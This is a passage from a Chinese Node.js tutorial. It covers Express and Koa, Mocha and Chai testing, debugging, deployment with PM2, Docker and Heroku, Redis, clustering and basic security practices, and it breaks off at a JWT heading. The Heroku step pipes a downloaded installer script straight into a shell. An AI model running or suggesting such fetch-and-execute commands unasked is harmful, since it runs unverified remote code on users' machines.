<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello, Express!&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="6-1-2-路由与中间件"><a href="#6-1-2-路由与中间件" class="headerlink" title="6.1.2 路由与中间件"></a>6.1.2 路由与中间件</h4><p><strong>定义路由：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;req.params.id&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>使用中间件：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="6-1-3-处理表单和-JSON-数据"><a href="#6-1-3-处理表单和-JSON-数据" class="headerlink" title="6.1.3 处理表单和 JSON 数据"></a>6.1.3 处理表单和 JSON 数据</h4><p><code>Express</code> 可以使用 <code>express.urlencoded()</code> 和 <code>express.json()</code> 中间件来处理表单数据和 JSON 数据。</p>
<p><strong>处理 JSON 数据：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/submit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Data received.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="6-1-4-错误处理"><a href="#6-1-4-错误处理" class="headerlink" title="6.1.4 错误处理"></a>6.1.4 错误处理</h4><p>定义错误处理中间件，捕获路由和中间件中的错误。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">err, req, res, next</span>) =&gt;</span> &#123;<br><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h3 id="6-2-使用-Koa-框架"><a href="#6-2-使用-Koa-框架" class="headerlink" title="6.2 使用 Koa 框架"></a>6.2 使用 Koa 框架</h3><p><code>Koa</code> 是由 Express 的原始团队设计的新一代 Web 框架，基于中间件的功能更强大、更灵活。</p>
<h4 id="6-2-1-Koa-的特点与-Express-对比"><a href="#6-2-1-Koa-的特点与-Express-对比" class="headerlink" title="6.2.1 Koa 的特点与 Express 对比"></a>6.2.1 Koa 的特点与 Express 对比</h4><ul>
<li><strong>更现代化</strong>：Koa 使用 ES6 <code>async/await</code> 处理异步操作，简化了代码逻辑。</li>
<li><strong>中间件设计</strong>：Koa 的中间件更加灵活，开发者可以完全控制响应流程。</li>
</ul>
<h4 id="6-2-2-创建-Koa-应用"><a href="#6-2-2-创建-Koa-应用" class="headerlink" title="6.2.2 创建 Koa 应用"></a>6.2.2 创建 Koa 应用</h4><p>安装 <code>Koa</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install koa<br></code></pre></td></tr></table></figure>

<p><strong>创建基本 Koa 应用：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Koa</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Koa</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">&#x27;Hello, Koa!&#x27;</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="6-2-3-中间件与路由处理"><a href="#6-2-3-中间件与路由处理" class="headerlink" title="6.2.3 中间件与路由处理"></a>6.2.3 中间件与路由处理</h4><p><strong>定义中间件：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">async</span> (ctx, next) =&gt; &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request URL: <span class="hljs-subst">$&#123;ctx.url&#125;</span>`</span>);<br>  <span class="hljs-keyword">await</span> <span class="hljs-title function_">next</span>();<br>&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>处理路由：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Router</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;koa-router&#x27;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Router</span>();<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-title function_">async</span> (ctx) =&gt; &#123;<br>  ctx.<span class="hljs-property">body</span> = <span class="hljs-string">`User ID: <span class="hljs-subst">$&#123;ctx.params.id&#125;</span>`</span>;<br>&#125;);<br><br>app.<span class="hljs-title function_">use</span>(router.<span class="hljs-title function_">routes</span>());<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="7-测试与调试-1"><a href="#7-测试与调试-1" class="headerlink" title="7. 测试与调试"></a>7. 测试与调试</h2><p>Node.js 提供了多种测试与调试工具，帮助开发者确保代码的正确性和性能。</p>
<h3 id="7-1-单元测试与集成测试"><a href="#7-1-单元测试与集成测试" class="headerlink" title="7.1 单元测试与集成测试"></a>7.1 单元测试与集成测试</h3><p>单元测试是确保各个模块功能正常的基本方式。<code>Mocha</code> 是 Node.js 中常用的测试框架，配合 <code>Chai</code> 进行断言。</p>
<h4 id="7-1-1-使用-Mocha-进行单元测试"><a href="#7-1-1-使用-Mocha-进行单元测试" class="headerlink" title="7.1.1 使用 Mocha 进行单元测试"></a>7.1.1 使用 Mocha 进行单元测试</h4><p>安装 <code>Mocha</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save-dev mocha<br></code></pre></td></tr></table></figure>

<p><strong>编写简单测试：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> assert = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    assert.<span class="hljs-title function_">strictEqual</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>运行测试：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx mocha<br></code></pre></td></tr></table></figure>

<h4 id="7-1-2-使用-Chai-进行断言"><a href="#7-1-2-使用-Chai-进行断言" class="headerlink" title="7.1.2 使用 Chai 进行断言"></a>7.1.2 使用 Chai 进行断言</h4><p>安装 <code>Chai</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install chai --save-dev<br></code></pre></td></tr></table></figure>

<p><strong>使用 <code>Chai</code> 进行更丰富的断言：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> chai = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;chai&#x27;</span>);<br><span class="hljs-keyword">const</span> expect = chai.<span class="hljs-property">expect</span>;<br><br><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Math Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should return the sum of two numbers&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">expect</span>(<span class="hljs-number">1</span> + <span class="hljs-number">1</span>).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">2</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="7-1-3-测试异步代码"><a href="#7-1-3-测试异步代码" class="headerlink" title="7.1.3 测试异步代码"></a>7.1.3 测试异步代码</h4><p>Mocha 支持测试异步代码，使用 <code>done</code> 回调或者 <code>async/await</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;Async Test&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;should test async code&#x27;</span>, <span class="hljs-title function_">async</span> () =&gt; &#123;<br>    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-number">42</span>), <span class="hljs-number">100</span>));<br>    <span class="hljs-title function_">expect</span>(result).<span class="hljs-property">to</span>.<span class="hljs-title function_">equal</span>(<span class="hljs-number">42</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h3 id="7-2-调试-Node-js-应用"><a href="#7-2-调试-Node-js-应用" class="headerlink" title="7.2 调试 Node.js 应用"></a>7.2 调试 Node.js 应用</h3><h4 id="7-2-1-使用-console-log-调试"><a href="#7-2-1-使用-console-log-调试" class="headerlink" title="7.2.1 使用 console.log 调试"></a>7.2.1 使用 <code>console.log</code> 调试</h4><p>最简单的调试方式是通过 <code>console.log()</code> 输出变量值和函数的执行情况。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Debugging: &#x27;</span>, someVariable);<br></code></pre></td></tr></table></figure>

<h4 id="7-2-2-使用-Node-js-内置调试器"><a href="#7-2-2-使用-Node-js-内置调试器" class="headerlink" title="7.2.2 使用 Node.js 内置调试器"></a>7.2.2 使用 <code>Node.js</code> 内置调试器</h4><p>Node.js 自带了调试器，允许开发者设置断点并逐步调试代码。</p>
<p><strong>启动调试模式：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">node inspect app.js<br></code></pre></td></tr></table></figure>

<h4 id="7-2-3-使用-VS-Code-调试-Node-js-应用"><a href="#7-2-3-使用-VS-Code-调试-Node-js-应用" class="headerlink" title="7.2.3 使用 VS Code 调试 Node.js 应用"></a>7.2.3 使用 <code>VS Code</code> 调试 Node.js 应用</h4><p><code>Visual Studio Code</code> 提供了强大的调试工具，允许直接在编辑器中设置断点并运行调试。</p>
<p><strong>配置 <code>launch.json</code>：</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;node&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Launch Program&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/app.js&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="8-部署与性能优化-1"><a href="#8-部署与性能优化-1" class="headerlink" title="8. 部署与性能优化"></a>8. 部署与性能优化</h2><p>Node.js 应用可以通过多种方式进行部署，如使用 <strong>PM2</strong>、<strong>Docker</strong> 或在 <strong>云平台</strong> 上进行托管。</p>
<h3 id="8-1-部署-Node-js-应用"><a href="#8-1-部署-Node-js-应用" class="headerlink" title="8.1 部署 Node.js 应用"></a>8.1 部署 Node.js 应用</h3><h4 id="8-1-1-使用-PM2-进行进程管理"><a href="#8-1-1-使用-PM2-进行进程管理" class="headerlink" title="8.1.1 使用 PM2 进行进程管理"></a>8.1.1 使用 <code>PM2</code> 进行进程管理</h4><p><code>PM2</code> 是一个强大的 Node.js 进程管理工具，支持自动重启、日志管理等功能。</p>
<p>安装 <code>PM2</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install pm2 -g<br></code></pre></td></tr></table></figure>

<p><strong>启动应用：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 start app.js<br></code></pre></td></tr></table></figure>

<p><strong>查看应用状态：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pm2 status<br></code></pre></td></tr></table></figure>

<h4 id="8-1-2-Docker-部署-Node-js-应用"><a href="#8-1-2-Docker-部署-Node-js-应用" class="headerlink" title="8.1.2 Docker 部署 Node.js 应用"></a>8.1.2 Docker 部署 Node.js 应用</h4><p><strong>创建 <code>Dockerfile</code>：</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Dockerfile"><span class="hljs-keyword">FROM</span> node:<span class="hljs-number">14</span><br><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> . .</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> npm install</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;node&quot;</span>, <span class="hljs-string">&quot;app.js&quot;</span>]</span><br></code></pre></td></tr></table></figure>

<p><strong>构建 Docker 镜像并运行：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t myapp .<br>docker run -p 3000:3000 myapp<br></code></pre></td></tr></table></figure>

<h4 id="8-1-3-在云平台上部署-Node-js"><a href="#8-1-3-在云平台上部署-Node-js" class="headerlink" title="8.1.3 在云平台上部署 Node.js"></a>8.1.3 在云平台上部署 Node.js</h4><p>Node.js 可以轻松部署到各种云平台，如 AWS、Heroku、Google Cloud 等。</p>
<p><strong>Heroku 部署步骤：</strong></p>
<ol>
<li><p>安装 Heroku CLI：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://cli-assets.heroku.com/install.sh | sh<br></code></pre></td></tr></table></figure>
</li>
<li><p>登录 Heroku：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku login<br></code></pre></td></tr></table></figure>
</li>
<li><p>部署应用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">heroku create<br>git push heroku master<br></code></pre></td></tr></table></figure></li>
</ol>
<h3 id="8-2-性能优化与缓存"><a href="#8-2-性能优化与缓存" class="headerlink" title="8.2 性能优化与缓存"></a>8.2 性能优化与缓存</h3><h4 id="8-2-1-使用-Redis-缓存"><a href="#8-2-1-使用-Redis-缓存" class="headerlink" title="8.2.1 使用 Redis 缓存"></a>8.2.1 使用 Redis 缓存</h4><p>Redis 是一种内存数据结构存储，常用于缓存数据以减少数据库压力。</p>
<p>安装 Redis 客户端：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install redis<br></code></pre></td></tr></table></figure>

<p><strong>连接 Redis 并设置缓存：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);<br><span class="hljs-keyword">const</span> client = redis.<span class="hljs-title function_">createClient</span>();<br><br>client.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;value&#x27;</span>, redis.<span class="hljs-property">print</span>);<br>client.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, reply</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(reply);  <span class="hljs-comment">// 输出: value</span><br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="8-2-2-内存优化与垃圾回收"><a href="#8-2-2-内存优化与垃圾回收" class="headerlink" title="8.2.2 内存优化与垃圾回收"></a>8.2.2 内存优化与垃圾回收</h4><p>Node.js 是基于 V8 引擎的，V8 自带了垃圾回收机制，但在大数据处理时需要注意内存管理。</p>
<p><strong>检测内存使用情况：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(process.<span class="hljs-title function_">memoryUsage</span>());<br></code></pre></td></tr></table></figure>

<h4 id="8-2-3-使用集群模式提高性能"><a href="#8-2-3-使用集群模式提高性能" class="headerlink" title="8.2.3 使用集群模式提高性能"></a>8.2.3 使用集群模式提高性能</h4><p>Node.js 单线程模型可以通过 <strong>Cluster 模式</strong> 利用多核 CPU 提高性能。</p>
<p><strong>使用 <code>cluster</code> 模块创建多进程：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> cluster = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cluster&#x27;</span>);<br><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> os = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;os&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (cluster.<span class="hljs-property">isMaster</span>) &#123;<br>  <span class="hljs-keyword">const</span> numCPUs = os.<span class="hljs-title function_">cpus</span>().<span class="hljs-property">length</span>;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Master process running, spawning <span class="hljs-subst">$&#123;numCPUs&#125;</span> workers...`</span>);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numCPUs; i++) &#123;<br>    cluster.<span class="hljs-title function_">fork</span>();<br>  &#125;<br>  <br>  cluster.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">worker, code, signal</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;worker.process.pid&#125;</span> died.`</span>);<br>  &#125;);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello from worker\n&#x27;</span>);<br>  &#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>);<br>  <br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Worker <span class="hljs-subst">$&#123;process.pid&#125;</span> started`</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="9-安全性-1"><a href="#9-安全性-1" class="headerlink" title="9. 安全性"></a>9. 安全性</h2><p>Node.js 的安全性在 Web 应用中至关重要，常见的威胁包括 <strong>注入攻击</strong>、<strong>跨站脚本攻击 (XSS)</strong> 和 <strong>CSRF</strong>。</p>
<h3 id="9-1-安全性最佳实践"><a href="#9-1-安全性最佳实践" class="headerlink" title="9.1 安全性最佳实践"></a>9.1 安全性最佳实践</h3><h4 id="9-1-1-防止注入攻击"><a href="#9-1-1-防止注入攻击" class="headerlink" title="9.1.1 防止注入攻击"></a>9.1.1 防止注入攻击</h4><p>避免直接拼接用户输入的数据，使用参数化查询防止 SQL 注入。</p>
<p><strong>使用参数化查询：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users WHERE id = ?&#x27;</span>, [userId], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure>

<h4 id="9-1-2-防止跨站脚本攻击-XSS"><a href="#9-1-2-防止跨站脚本攻击-XSS" class="headerlink" title="9.1.2 防止跨站脚本攻击 (XSS)"></a>9.1.2 防止跨站脚本攻击 (XSS)</h4><p>使用输入校验、输出编码和安全库（如 <code>helmet.js</code>）防止 XSS 攻击。</p>
<p><strong>输出编码：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> sanitizedData = <span class="hljs-title function_">escapeHtml</span>(userInput);<br></code></pre></td></tr></table></figure>

<h4 id="9-1-3-使用-helmet-js-保护应用"><a href="#9-1-3-使用-helmet-js-保护应用" class="headerlink" title="9.1.3 使用 helmet.js 保护应用"></a>9.1.3 使用 <code>helmet.js</code> 保护应用</h4><p><code>helmet.js</code> 是用于保护 Express 应用的安全库。</p>
<p>安装 <code>helmet</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install helmet<br></code></pre></td></tr></table></figure>

<p><strong>在 Express 中使用：</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> helmet = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;helmet&#x27;</span>);<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">helmet</span>());<br></code></pre></td></tr></table></figure>

<h3 id="9-2-身份验证与授权"><a href="#9-2-身份验证与授权" class="headerlink" title="9.2 身份验证与授权"></a>9.2 身份验证与授权</h3><h4 id="9-2-1-使用-JWT-进行身份验证"><a href="#9-2-1-使用-JWT-进行身份验证" class="headerlink" title="9.2.1 使用 JWT 进行身份验证"></a>9.2.1 使用 JWT 进行身份验证</h4><p>JWT (JSON Web Token) 是一种轻量级的身份验证机制，通常用于</p>
<p> API 身份认证。</p>
<p>安装 <code>jsonwebtoken</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install jsonwebtoken<br></code></pre></td></tr></table></figure>

<p><strong>生成 JWT：</strong></p>
